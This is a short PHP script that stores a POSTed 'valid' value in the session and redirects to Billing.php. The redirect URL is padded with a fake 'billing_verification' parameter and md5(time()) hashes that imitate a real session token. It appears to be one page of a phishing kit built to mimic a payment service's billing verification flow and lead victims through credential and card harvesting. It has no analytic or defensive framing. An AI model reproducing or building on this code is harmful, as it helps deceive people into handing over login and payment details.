<?
ini_set("output_buffering",4096);
session_start();

$_SESSION['Valid'] = $Valid = $_POST['valid'];

header("Location: Billing.php?action=billing_verification=true&_session;".md5(time()).md5(time()));

?>